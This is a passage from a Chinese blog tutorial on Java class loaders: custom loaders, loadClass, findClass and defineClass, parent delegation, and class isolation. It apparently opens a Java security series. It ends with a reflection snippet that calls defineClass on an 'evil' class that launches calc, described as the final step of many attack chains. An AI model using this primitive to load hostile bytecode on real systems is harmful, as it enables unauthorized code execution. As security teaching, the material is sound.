      <p>在有的资料中<strong>系统类加载器（System ClassLoader）</strong>也被称为<strong>应用类加载器（Application ClassLoader）</strong>。</p>

    </div>
  </div>

<h4 id="自定义类加载器（Custom-ClassLoader）"><a href="#自定义类加载器（Custom-ClassLoader）" class="headerlink" title="自定义类加载器（Custom ClassLoader）"></a>自定义类加载器（Custom ClassLoader）</h4><p>在 Java 中，类加载器负责将 <code>.class</code> 文件加载到 JVM 中，生成类的 <code>Class</code> 对象。默认的类加载器（如系统类加载器、扩展类加载器等）已经能够满足大部分的类加载需求，但是在某些场景下，我们需要根据特定的规则来加载类，这时就需要使用 <strong>自定义类加载器</strong>（Custom ClassLoader）。</p>
<p>自定义类加载器需要继承 <code>java.lang.ClassLoader</code> 并重写其方法，尤其是 <code>findClass</code> 方法，该方法是加载类的核心方法。例如下面是一个自定义类加载器的示例代码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String classPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(String classPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classPath = classPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 计算类文件路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> classPath + File.separator + name.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">classFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!classFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Class &quot;</span> + name + <span class="string">&quot; not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(classFile)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) classFile.length()];</span><br><span class="line">            inputStream.read(classBytes);</span><br><span class="line">            <span class="comment">// 使用 defineClass 方法将字节码转换为 Class 对象</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Error reading class file&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>(<span class="string">&quot;path/to/classes&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载自定义类</span></span><br><span class="line">        Class&lt;?&gt; clazz = myClassLoader.loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;Class loaded: &quot;</span> + clazz);</span><br><span class="line">        System.out.println(<span class="string">&quot;Object: &quot;</span> + obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="类加载器的获取"><a href="#类加载器的获取" class="headerlink" title="类加载器的获取"></a>类加载器的获取</h3><p>在 Java 中可以使用不同的方式来获取类加载器。以下是几种常见的获取类加载器的方法：</p>
<h4 id="获取当前类的类加载器"><a href="#获取当前类的类加载器" class="headerlink" title="获取当前类的类加载器"></a>获取当前类的类加载器</h4><p>要获取当前类（即包含当前代码的类）的类加载器，可以使用 <code>Class</code> 类的 <code>getClassLoader()</code> 方法。这个方法返回一个 <code>ClassLoader</code> 实例，表示当前类的类加载器。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> MyClass.class.getClassLoader();</span><br><span class="line">System.out.println(classLoader);</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>在 Java 中我们不能直接获取引导类加载器的引用，因为它是由 JVM 本身实现的，且不是 <code>ClassLoader</code> 类的子类。</p>
<p>例如如果我们使用 <code>Class.getClassLoader()</code> 方法来获取 <code>String</code> 类的类加载器，它会返回 <code>null</code>，因为 <code>String</code> 类是由引导类加载器加载的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">bootstrapClassLoader</span> <span class="operator">=</span> String.class.getClassLoader();</span><br><span class="line">System.out.println(bootstrapClassLoader);  <span class="comment">// 输出 null，因为 String 是由引导类加载器加载的</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h4 id="获取当前线程的上下文类加载器"><a href="#获取当前线程的上下文类加载器" class="headerlink" title="获取当前线程的上下文类加载器"></a>获取当前线程的上下文类加载器</h4><p>每个线程都可以设置一个上下文类加载器，通常用于某些框架或应用程序，尤其是在多线程环境中。可以使用 <code>Thread</code> 类的 <code>getContextClassLoader()</code> 方法获取当前线程的上下文类加载器。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br></pre></td></tr></table></figure></div>

<p>上下文类加载器通常用于在应用程序中加载与当前线程相关的资源（例如，数据库驱动或插件），尤其在使用反射、JDBC、JNDI 等场景中。</p>
<h4 id="获取系统类加载器（系统类加载器）"><a href="#获取系统类加载器（系统类加载器）" class="headerlink" title="获取系统类加载器（系统类加载器）"></a>获取系统类加载器（系统类加载器）</h4><p>系统类加载器是负责加载用户应用类路径下的类（例如，<code>classpath</code>）。可以通过 <code>ClassLoader.getSystemClassLoader()</code> 方法获取系统类加载器。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure></div>

<h3 id="类加载器常见方法"><a href="#类加载器常见方法" class="headerlink" title="类加载器常见方法"></a>类加载器常见方法</h3><h4 id="loadClass（加载指定的-Java-类）"><a href="#loadClass（加载指定的-Java-类）" class="headerlink" title="loadClass（加载指定的 Java 类）"></a>loadClass（加载指定的 Java 类）</h4><p><code>loadClass(String name)</code> 是 <code>ClassLoader</code> 类中一个常用的公共方法，用于加载类。它通过类的 <strong>二进制名称</strong>（即类的完全限定名，像 <code>java.lang.String</code>）来加载类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(name, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该方法首先会委托父类加载器（即父加载器）去加载类，如果父类加载器没有加载到类，它才会使用当前类加载器来加载。</p>
<h4 id="findClass（查找指定的-Java-类）"><a href="#findClass（查找指定的-Java-类）" class="headerlink" title="findClass（查找指定的 Java 类）"></a>findClass（查找指定的 Java 类）</h4><p><code>findClass</code> 是一个 <strong>抽象方法</strong>，通常需要在自定义类加载器中重写。<code>findClass</code> 会被 <code>loadClass</code> 方法调用，用于实际查找和加载类。类加载器不知道如何加载这个类则会抛出 <code>ClassNotFoundException</code> 异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException;</span><br></pre></td></tr></table></figure></div>

<h4 id="findLoadedClass（查找-JVM-已经加载过的类）"><a href="#findLoadedClass（查找-JVM-已经加载过的类）" class="headerlink" title="findLoadedClass（查找 JVM 已经加载过的类）"></a>findLoadedClass（查找 JVM 已经加载过的类）</h4><p><code>findLoadedClass</code> 方法用于查找<strong>当前类加载器</strong>是否已经加载了指定的类。如果类已经加载并被缓存，则返回该类的 <code>Class</code> 对象。它是在 <code>loadClass</code> 方法内部调用的，用来避免重复加载已经加载过的类。如果类已经被加载并且缓存，则返回该类的 <code>Class</code> 对象；否则返回 <code>null</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name);</span><br></pre></td></tr></table></figure></div>

<h4 id="defineClass（定义一个-Java-类）"><a href="#defineClass（定义一个-Java-类）" class="headerlink" title="defineClass（定义一个 Java 类）"></a>defineClass（定义一个 Java 类）</h4><p><code>defineClass</code> 将字节数组转换为一个 <code>Class</code> 对象。这个方法是 <code>ClassLoader</code> 的核心，用于将字节码定义为类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len) <span class="keyword">throws</span> ClassFormatError;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong><code>String name</code><strong>：要定义的类的</strong>全限定名称</strong>（例如 <code>com.example.MyClass</code>），它是该类在 JVM 中的名字。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p><code>name</code> 参数必须与字节码中的类名匹配**或者设置为 <code>null</code>**，否则会有如下报错：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.reflect.InvocationTargetException</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:483)</span><br><span class="line">	at com.example.Main.main(Main.java:12)</span><br><span class="line">Caused by: java.lang.NoClassDefFoundError: YourNameArgumentInput (wrong name: com/example/MyClass)</span><br><span class="line">	at java.lang.ClassLoader.defineClass1(Native Method)</span><br><span class="line">	at java.lang.ClassLoader.defineClass(ClassLoader.java:760)</span><br><span class="line">	at java.lang.ClassLoader.defineClass(ClassLoader.java:642)</span><br><span class="line">	... 5 more</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>defineClass</code> 还有一个默认 <code>name</code> 为 <code>null</code> 的封装：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, off, len, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>
</li>
<li><p><strong><code>byte[] b</code></strong> ：包含类的字节码的字节数组。这个字节数组包含了通过编译器或其他方式生成的 Java 字节码，通常是 <code>.class</code> 文件的内容。</p>
</li>
<li><p><strong><code>int off</code></strong> ：字节数组 <code>b</code> 中，字节码数据的起始偏移量。表示从数组 <code>b</code> 的哪个位置开始读取数据。一般情况下，如果整个数组都包含字节码数据，这个值为 <code>0</code>。</p>
</li>
<li><p><strong><code>int len</code></strong> ：要从字节数组 <code>b</code> 中读取的字节码数据的长度。表示从偏移量 <code>off</code> 开始，读取多长的数据来定义类。</p>
</li>
</ul>
<h4 id="resolveClass（链接指定的-Java-类）"><a href="#resolveClass（链接指定的-Java-类）" class="headerlink" title="resolveClass（链接指定的 Java 类）"></a>resolveClass（链接指定的 Java 类）</h4><p><code>resolveClass</code> 方法用于<strong>解析</strong>一个类。类加载器通过此方法将类链接到 JVM 中，并确保该类已经准备好执行。这个方法通常在类被 <code>defineClass</code> 后调用，用于确保类已经完全初始化，并准备好进一步的操作（如方法调用等）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="双亲委派模型（Parent-Delegation-Model）"><a href="#双亲委派模型（Parent-Delegation-Model）" class="headerlink" title="双亲委派模型（Parent Delegation Model）"></a>双亲委派模型（Parent Delegation Model）</h3><p>双亲委派模型（Parent Delegation Model）是 Java 类加载器机制中的一种设计模式。通过这种模型，<strong>类加载器在加载类时，会先将请求委托给父类加载器处理，如果父类加载器无法加载这个类，才由当前类加载器尝试加载</strong>。</p>
<p>这种机制保证了Java核心类库（如<code>java.lang.*</code>、<code>java.util.*</code>等）始终由引导类加载器（Bootstrap ClassLoader）加载，从而避免了类的重复加载和冲突，确保了 Java 核心类库的安全性。</p>
<h4 id="类加载器层次结构"><a href="#类加载器层次结构" class="headerlink" title="类加载器层次结构"></a>类加载器层次结构</h4><p>在 Java 中，类加载器采用<strong>双亲委派模型</strong>来加载类。这个模型的层次结构是通过父子关系来表示的，不同层次的类加载器通过<code>getParent()</code>方法来连接。</p>
<p>我们可以通过如下代码验证类加载器的层次结构：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();  <span class="comment">// 默认父加载器是系统类加载器</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);  <span class="comment">// 你也可以显式指定父加载器</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 自定义的类加载逻辑</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;自定义类加载器: &quot;</span> + myClassLoader);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> myClassLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器: &quot;</span> + systemClassLoader);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">extClassLoader</span> <span class="operator">=</span> systemClassLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器: &quot;</span> + extClassLoader);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">bootstrapClassLoader</span> <span class="operator">=</span> extClassLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;启动类加载器: &quot;</span> + bootstrapClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码运行结果如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">自定义类加载器: com.example.MyClassLoader@330bedb4</span><br><span class="line">系统类加载器: sun.misc.Launcher$AppClassLoader@58644d46</span><br><span class="line">扩展类加载器: sun.misc.Launcher$ExtClassLoader@2503dbd3</span><br><span class="line">启动类加载器: null</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p><strong>自定义类加载器</strong>默认的父级是 <strong>系统类加载器</strong>。当你创建一个自定义类加载器时，它会继承 <code>ClassLoader</code> 类，而 <code>ClassLoader</code> 的构造方法会自动指定父加载器。具体来说：</p>
<ul>
<li>如果你没有显式指定父加载器，<code>ClassLoader</code> 的构造函数会将 <strong>系统类加载器</strong>（<code>ClassLoader.getSystemClassLoader()</code>）作为默认的父加载器。</li>
<li>你也可以通过重载构造函数，手动设置父加载器为其他加载器（如启动类加载器或扩展类加载器），但通常情况下，它的父加载器默认是 <strong>系统类加载器</strong>。</li>
</ul>

    </div>
  </div>

<p>因此类加载器的层次结构如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/ParentDelegationModel.svg"
                      alt="ParentDelegationModel"
                ></p>
<h4 id="双亲委派模型具体实现"><a href="#双亲委派模型具体实现" class="headerlink" title="双亲委派模型具体实现"></a>双亲委派模型具体实现</h4><p>在Java中，每个类加载器都有一个父类加载器，类加载器在加载类时，遵循以下步骤：</p>
<ol>
<li><strong>检查当前类是否已经加载</strong>：如果已经加载，则直接返回。</li>
<li><strong>委托父类加载器加载</strong>：将加载请求委托给父类加载器，依次递归，直到最顶层的Bootstrap ClassLoader。</li>
<li><strong>父类加载器无法加载</strong>：如果父类加载器无法加载该类，则当前类加载器尝试自己加载。</li>
</ol>
<p>在 Java 中，类加载器之间的双亲委派模型可以通过 <code>ClassLoader</code> 类的 <code>loadClass</code> 方法来实现。以下是 <code>ClassLoader</code> 类中 <code>loadClass</code> 方法的简化实现：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 检查类是否已经加载</span></span><br><span class="line">    Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 委托父类加载器加载</span></span><br><span class="line">                c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 使用引导类加载器加载</span></span><br><span class="line">                c = findBootstrapClassOrNull(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// 父类加载器无法加载时，当前类加载器尝试加载</span></span><br><span class="line">            c = findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">        <span class="comment">// 类加载完成，对加载的类进行链接和初始化</span></span><br><span class="line">        resolveClass(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="类加载器与类的隔离性"><a href="#类加载器与类的隔离性" class="headerlink" title="类加载器与类的隔离性"></a>类加载器与类的隔离性</h3><p> 类加载器与类的隔离性是 Java 设计中的重要特性之一，它使得不同的类加载器能够加载同名的类，而这些类相互独立、互不干扰，从而避免了不同模块或应用之间的类冲突。类加载器与类的隔离性对于实现模块化、插件化以及动态类加载系统非常关键。</p>
<h4 id="类命名空间"><a href="#类命名空间" class="headerlink" title="类命名空间"></a>类命名空间</h4><p>类命名空间（<strong>Class Namespace</strong>）是指类加载器在加载类时为其所分配的一个独立的命名空间。在 Java 中，<strong>每个类加载器都有自己的命名空间</strong>，用来隔离自己加载的类与其他类加载器加载的类。这种隔离机制保证了<strong>即使不同类加载器加载了相同名称的类，它们也可以作为独立的类存在，而互不干扰</strong>。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>不同的类加载器在加载类时依赖于自己的命名空间来确定类是否已经被加载以及加载后的处理。这就是为什么 <code>loadClass</code> 在双亲委派模型中每一级类加载器都要调用 <code>findLoadedClass</code> 来判断类是否已经被加载过了。</p>

    </div>
  </div>

<h4 id="类加载的隔离性"><a href="#类加载的隔离性" class="headerlink" title="类加载的隔离性"></a>类加载的隔离性</h4><p>Java 中的类是通过类加载器加载的。当一个类被类加载器加载时，它会被分配一个 <code>Class</code> 对象，该对象代表了这个类在 JVM 中的唯一身份。对于同一个类，如果通过不同的类加载器加载，它们的 <code>Class</code> 对象是不同的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">loader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">loader2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; class1 = loader1.loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line">Class&lt;?&gt; class2 = loader2.loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(class1 == class2);  <span class="comment">// 输出 false</span></span><br></pre></td></tr></table></figure></div>

<p>这是因为每个类加载器在加载类时，都会在自己的命名空间中维护已加载的类。类加载器的命名空间是独立的，意味着相同的类，如果由不同的类加载器加载，它们将被认为是不同的类，即使它们的字节码完全相同。</p>
<h2 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h2><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是 <code>loadClass</code>、<code>findClass</code>、<code>defineClass</code> 这三个方法调用。其中 <code>defineClass</code> 的作用是将获取到的字节码处理成真正的 Java 类，是类加载中真正核心的部分。</p>
<p>Java 默认的 <code>ClassLoader#defineClass</code> 是一个 native 方法，逻辑在 JVM 的 C 代码中。我们可以通过反射调用这个方法把字节码转换为类：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] classByteCode = getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = (Class&lt;?&gt;) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), classByteCode, <span class="number">0</span>, classByteCode.length);</span><br><span class="line">clazz.newInstance();</span><br></pre></td></tr></table></figure></div>

<p>在实际场景中，因为 <code>defineClass</code> 方法作用域是不开放的，所以攻击者很少能直接利用到它，但很多攻击链最终都是通过这个方法加载字节码。</p>
